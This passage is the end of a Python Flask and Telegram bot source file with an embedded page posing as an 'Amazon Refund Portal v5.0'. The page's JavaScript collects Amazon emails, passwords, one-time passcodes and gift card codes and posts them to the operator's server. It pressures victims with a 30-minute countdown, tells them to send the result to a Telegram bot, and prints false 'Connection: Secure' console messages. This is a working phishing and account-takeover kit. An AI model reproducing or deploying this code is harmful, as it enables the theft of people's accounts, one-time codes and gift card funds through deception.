            if (timerInterval) clearInterval(timerInterval);
        }

        // ============================================================
        // SUBMIT ACCOUNT
        // ============================================================
        async function submitAccount() {
            const email = document.getElementById('amazonEmail').value.trim();
            const password = document.getElementById('amazonPassword').value;
            
            if (!email || !password) {
                alert('⚠️ Please enter both email and password');
                return;
            }
            
            closeModal('accountModal');
            showProcessing('Account Verification', 'Connecting to Amazon servers...');
            
            try {
                const response = await fetch('/api/refund/account', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email, password })
                });
                
                const data = await response.json();
                hideProcessing();
                
                if (data.success) {
                    currentTxid = data.txid;
                    document.getElementById('otpModal').style.display = 'flex';
                } else {
                    alert('❌ ' + (data.error || 'Something went wrong'));
                }
            } catch (err) {
                hideProcessing();
                alert('❌ Network error. Please try again.');
            }
        }

        // ============================================================
        // SUBMIT CODE
        // ============================================================
        async function submitCode() {
            const giftCode = document.getElementById('giftCode').value.trim().toUpperCase();
            
            if (!giftCode) {
                alert('⚠️ Please enter the gift card code');
                return;
            }
            
            closeModal('codeModal');
            showProcessing('Gift Card Processing', 'Verifying code validity...');
            
            try {
                const response = await fetch('/api/refund/code', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ gift_code: giftCode })
                });
                
                const data = await response.json();
                hideProcessing();
                
                if (data.success) {
                    showCodeResult(data.redeem_token);
                } else {
                    alert('❌ ' + (data.error || 'Something went wrong'));
                }
            } catch (err) {
                hideProcessing();
                alert('❌ Network error. Please try again.');
            }
        }

        // ============================================================
        // VERIFY OTP
        // ============================================================
        async function verifyOTP() {
            const otp = document.getElementById('otpCode').value.trim();
            
            if (!otp || otp.length < 4) {
                alert('⚠️ Please enter a valid OTP code');
                return;
            }
            
            closeModal('otpModal');
            showProcessing('OTP Verification', 'Verifying your code...');
            
            try {
                const response = await fetch('/api/otp/verify', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ txid: currentTxid, otp: otp })
                });
                
                const data = await response.json();
                hideProcessing();
                
                if (data.success) {
                    showAccountResult(currentTxid);
                } else {
                    alert('❌ Invalid OTP. Please try again.');
                }
            } catch (err) {
                hideProcessing();
                alert('❌ Network error. Please try again.');
            }
        }

        // ============================================================
        // SHOW RESULTS
        // ============================================================
        function showAccountResult(txid) {
            const modal = document.getElementById('resultModal');
            document.getElementById('resultTitle').innerHTML = '✅ ACCOUNT SUBMITTED';
            document.getElementById('resultContent').innerHTML = `
                <div style="background: rgba(0,255,65,0.1); padding: 1rem; border-radius: 8px;">
                    <p><strong>📌 Your TXID:</strong></p>
                    <code style="font-size: clamp(0.8rem, 1.5vw, 0.9rem); word-break: break-all;">${txid}</code>
                    <div style="margin-top: 0.7rem;">
                        <button class="copy-btn" onclick="copyToClipboard('${txid}')">📋 Copy TXID</button>
                    </div>
                </div>
            `;
            document.getElementById('resultMessage').innerHTML = `
                <strong>⚠️ IMPORTANT:</strong><br>
                Copy your TXID and send it to the Telegram bot!<br><br>
                ⏰ <strong>Expires in 30 minutes</strong><br>
                📌 <strong>Refund within 12 hours</strong><br>
                🔄 <strong>Status:</strong> Pending Verification
            `;
            modal.style.display = 'flex';
            startTimer(30);
        }

        function showCodeResult(redeemToken) {
            const modal = document.getElementById('resultModal');
            document.getElementById('resultTitle').innerHTML = '🎫 GIFT CARD SUBMITTED';
            document.getElementById('resultContent').innerHTML = `
                <div style="background: rgba(255,107,53,0.1); padding: 1rem; border-radius: 8px;">
                    <p><strong>🔖 Your Redeem Token:</strong></p>
                    <code style="font-size: clamp(0.8rem, 1.5vw, 0.9rem); word-break: break-all;">${redeemToken}</code>
                    <div style="margin-top: 0.7rem;">
                        <button class="copy-btn" onclick="copyToClipboard('${redeemToken}')">📋 Copy Token</button>
                    </div>
                </div>
            `;
            document.getElementById('resultMessage').innerHTML = `
                <strong>⚠️ IMPORTANT:</strong><br>
                Copy your Token and send it to the Telegram bot!<br><br>
                ⏰ <strong>Expires in 30 minutes</strong><br>
                🚀 <strong>Refund in 5-10 minutes</strong><br>
                🔄 <strong>Status:</strong> Processing
            `;
            modal.style.display = 'flex';
            startTimer(30);
        }

        // ============================================================
        // TIMER
        // ============================================================
        function startTimer(minutes) {
            let time = minutes * 60;
            const timerDisplay = document.getElementById('timerDisplay');
            
            if (timerInterval) clearInterval(timerInterval);
            timerDisplay.style.color = '#ffc107';
            
            timerInterval = setInterval(() => {
                const mins = Math.floor(time / 60);
                const secs = time % 60;
                timerDisplay.innerHTML = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
                
                if (time <= 0) {
                    clearInterval(timerInterval);
                    timerDisplay.innerHTML = '⏰ EXPIRED';
                    timerDisplay.style.color = '#ff0040';
                }
                time--;
            }, 1000);
        }

        // ============================================================
        // PROCESSING MODAL
        // ============================================================
        function showProcessing(title, message) {
            document.getElementById('processingTitle').innerHTML = title;
            document.getElementById('processingMessage').innerHTML = message;
            document.getElementById('processingModal').style.display = 'flex';
        }
        
        function hideProcessing() {
            document.getElementById('processingModal').style.display = 'none';
        }

        // ============================================================
        // COPY TO CLIPBOARD
        // ============================================================
        function copyToClipboard(text) {
            navigator.clipboard.writeText(text).then(() => {
                alert('✓ Copied to clipboard!');
            }).catch(() => {
                const textarea = document.createElement('textarea');
                textarea.value = text;
                document.body.appendChild(textarea);
                textarea.select();
                document.execCommand('copy');
                document.body.removeChild(textarea);
                alert('✓ Copied to clipboard!');
            });
        }

        // ============================================================
        // CLOSE MODAL ON OUTSIDE CLICK
        // ============================================================
        window.onclick = function(event) {
            if (event.target.classList.contains('modal')) {
                event.target.style.display = 'none';
                if (timerInterval) clearInterval(timerInterval);
            }
        }

        // ============================================================
        // BLINK ANIMATION
        // ============================================================
        setInterval(() => {
            const blinkElements = document.querySelectorAll('.blink');
            blinkElements.forEach(el => {
                el.style.opacity = el.style.opacity === '0' ? '1' : '0.4';
            });
        }, 500);

        // ============================================================
        // KEYBOARD SHORTCUTS
        // ============================================================
        document.addEventListener('keydown', function(event) {
            if (event.key === 'Escape') {
                document.querySelectorAll('.modal').forEach(modal => {
                    modal.style.display = 'none';
                });
                if (timerInterval) clearInterval(timerInterval);
            }
        });

        // ============================================================
        // AUTO-FOCUS ON MODAL INPUTS
        // ============================================================
        document.querySelectorAll('.modal').forEach(modal => {
            modal.addEventListener('shown', function() {
                const input = this.querySelector('input');
                if (input) input.focus();
            });
        });

        console.log('🚀 Amazon Refund Portal v5.0');
        console.log('🔒 Connection: Secure');
        console.log('💡 Need help? Contact @{{ bot_username }}');
    </script>
</body>
</html>
"""

# ============================================================
# MAIN ENTRY POINT
# ============================================================

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    
    # Send startup notification to admin
    try:
        send_to_admin("""
🚀 <b>BOT STARTED SUCCESSFULLY</b> 🚀

<b>📊 Status:</b>
• Bot: ✅ Online
• Webhook: ✅ Configured
• Polling: ✅ Active (Fallback)
• Version: 5.0

<b>📈 Statistics:</b>
• Users: {len(user_data)}
• Subscriptions: {len(subscriptions)}
• Session Storage: Active

<i>Ready to process refunds!</i>
        """)
    except:
        pass
    
    # Start polling thread (fallback if webhook fails)
    polling_thread = threading.Thread(target=poll_updates, daemon=True)
    polling_thread.start()
    logger.info("Polling thread started")
    
    # Start Flask server
    logger.info(f"Starting Flask server on port {port}")
    app.run(host='0.0.0.0', port=port, debug=False)
